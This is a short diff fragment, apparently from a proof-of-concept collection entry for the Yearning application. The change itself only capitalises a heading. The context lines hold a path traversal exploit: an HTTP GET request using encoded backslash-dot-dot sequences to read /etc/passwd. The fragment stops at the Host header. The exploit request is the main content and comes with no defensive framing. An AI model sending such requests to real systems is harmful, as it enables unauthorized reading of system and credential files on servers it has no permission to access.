@@ -7,7 +7,7 @@
 app="Yearning"
 ```
 
-## poc
+## POC
 ```
 GET /front/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd HTTP/1.1
 Host: 
